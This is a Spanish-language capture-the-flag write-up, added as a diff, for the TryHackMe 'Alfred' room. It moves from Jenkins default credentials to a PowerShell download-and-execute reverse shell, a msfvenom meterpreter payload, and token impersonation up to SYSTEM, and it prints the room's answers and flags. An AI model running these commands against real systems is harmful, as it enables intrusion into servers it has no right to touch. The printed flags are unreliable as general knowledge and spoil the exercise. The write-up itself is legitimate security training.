@@ -1,0 +1,250 @@
+Privilege Escalation in windows Themed CTF:
+Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
+
+URL: https://tryhackme.com/room/alfred
+
+-----------
+1. ACCESO INICIAL
+---------------------------------
+
+
+Escaneo General NMAP:
+------------------------------------------
+
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.203.77 -oG AllPorts
+
+Ports: 80/open/tcp//http///
+3389/open/tcp//ms-wbt-server///
+8080/open/tcp//http-proxy///
+
+---------
+Escaneo Específico NMAP:
+----------------------------------------------
+nmap -sC -sV -p80,3389,8080 10.10.203.77
+
+
+---------
+
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+http-title: Site doesn't have a title (text/html).
+3389/tcp open  ssl/ms-wbt-server?
+ssl-cert: Subject: commonName=alfred Not valid before: 2023-01-22T08:16:14
+Not valid after:  2023-07-24T08:16:14
+ssl-date: 2023-01-23T08:22:47+00:00; -1s from scanner time.
+8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
+http-title: Site doesn't have a title (text/html;charset=utf-8).
+http-server-header: Jetty(9.4.z-SNAPSHOT)
+http-robots.txt: 1 disallowed entry 
+/
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+*********************************************************************************
+
+
+
+1.1 How many ports are open? (TCP only)  
+3
+
+Empezamos a navegar a través del navegador para ver que contenido tenemos en la dirección 10.10.188.129:80, la cual nos devuelve una simple página con una imagen, nada que podamos destacar ahí.
+Posteriormente accedemos a la otra página que contiene una web, ene l puerto 8080, la cual nos devuelve un login de Jenkins.
+Nos aprovechamos de BurpSuite para lanzar una request del login y mandarlo al intruder, así mediante una wordlist conseguimos sacar las credenciales para acceder al panel de administración.
+
+---------
+
+1.2.What is the username and password for the log in panel(in the format username:password)**
+admin:admin
+
+
+1.3.Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it:
+
+Antes que nada, descargamos el script de powershell necesario para conectarnos
+
+Invoke-PowerShellTcp.ps1:
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+Tras acceder al panel de administración, podemos acceder para crear nuestro propio projecto, pondrtemos un nombre cualquiera, yo le he puesto attack, elegimos freestyle project y le damos a ok, después bajamos en donde está el apartado de build y elegimos execute windows batch command, el cual nos permite lanzar comandos arbitrariamente.
+Empezaremos con este comando de abajo, pero primero abrirermos un oyente en nuestro puerto 4445 con:
+nc -lvnp 4445
+
+También abrimos un servidor http con python3 para pasar coger también el script de powershell con el comando:
+python3 -m http.server
+
+Comando para introducir en consola jenkins:
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.18.21.167:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.18.21.167 -Port 4445
+
+------------
+
+Mediante este comando, y previamente abrir un listener/oyente en nuestra máquina atacante, iremos al apartado de Build Now dentro de nuestro projecto creado (en la web de jenkins) y recibiremos una shell.
+
+
+1.4.What is the user.txt flag?
+79007a09481963edf2e1321abd9ae2a0
+
+
+
+
+
+
+2.Cambio de consola a meterpreter
+---------------------------------
+
+1º Para proceder a cambiar a una meterpreter, primero debremos de general la payload con msfconsole:
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.21.167 LPORT=4446 -f exe -o shell.exe
+
+2º Posteriormente en nuestro preojecto de Jenkins, ejecutamos este comando:
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.18.21.167:8000/shell.exe','shell.exe')"
+
+3º Preparamos el multi/handler de metasploit:
+use exploit/multi/handler 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST 10.18.21.167
+set LPORT 4446 
+run
+
+4º Volvemos a abrir una shell de powershell como la anteriormente obtenida y ejecutamos el proceso de nuestra shell.exe para recibir la conexión por el metasploit:
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.18.21.167:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.18.21.167 -Port 4445
+
+En la shell obtenida, ejecutamos el siguiente comando para obtener la shell por meterpreter:
+Start-Process "shell.exe"
+
+----------------------------------
+
+2.1.What is the final size of the exe payload that you generated?
+73802 bytes
+
+------------------
+
+
+
+
+
+
+
+3.Escalada de privilegios:
+--------------------------
+
+
+En la shell de meterpreter, cargamos una shell de powershell con los comandos:
+1º load powershell
+2º powershell_shell
+
+Podemos comenzar a revisar los privilegios del usuario, empezamos ejecutando whoami /priv
+Nos devuelve lo siguiente:
+
+-----------------
+--------------
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege         Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
+SeTimeZonePrivilege             Change the time zone                      Disabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+
+
+-----------
+--------------
+******************************************************************************************************************
+******************************************************************************************************************
+Dejo por aquí una lista de los privilegios "explotables":
+-   SeImpersonatePrivilege
+-   SeAssignPrimaryPrivilege
+-   SeTcbPrivilege
+-   SeBackupPrivilege
+-   SeRestorePrivilege
+-   SeCreateTokenPrivilege
+-   SeLoadDriverPrivilege
+-   SeTakeOwnershipPrivilege
+-   SeDebugPrivilege
+******************************************************************************************************************
+******************************************************************************************************************
+
+De los privilegios obtenidos de Alfred, destacamos:
+-SeDebugPrivilege
+-SeImpersonatePrivilege
+
+
+Procedemos a salir de la shell de powershell y cargar el módulo de incógnito
+load incognito
+
+Procedemos a listar los tokens de usuario disponibles para suplantar:
+ list_tokens -g
+
+
+-----------------
+Delegation Tokens Available
+========================================
+\
+BUILTIN\Administrators
+BUILTIN\Users
+NT AUTHORITY\Authenticated Users
+NT AUTHORITY\NTLM Authentication
+NT AUTHORITY\SERVICE
+NT AUTHORITY\This Organization
+NT SERVICE\AudioEndpointBuilder
+NT SERVICE\CertPropSvc
+NT SERVICE\CscService
+NT SERVICE\iphlpsvc
+NT SERVICE\LanmanServer
+NT SERVICE\PcaSvc
+NT SERVICE\Schedule
+NT SERVICE\SENS
+NT SERVICE\SessionEnv
+NT SERVICE\TrkWks
+NT SERVICE\UmRdpService
+NT SERVICE\UxSms
+NT SERVICE\WdiSystemHost
+NT SERVICE\Winmgmt
+NT SERVICE\wuauserv
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+----------
+
+De los tokens obtenidos, podemos destacar el de _BUILTIN/Administrators
+Podemos proceder a suplantarlo mediante el siguiente comando:
+
+impersonate_token "BUILTIN\Administrators"
+
+
+Para una escalada mejor elaborada, tendremos que migrar al proceso de services.exe (ya que es más seguro y con mejor privilegios)
+1º PS
+2º migrate numero_De_PID_Services
+
+En este punto, si volvemos a cargar la powershell_shell y hacemos el comando "whoami" podemos ver qeu somos  nt authority\system
+
+
+3.1.read the root.txt file at C:\Windows\System32\config
+dff0f748678f280250f25a45b8046b4a
+
+
+
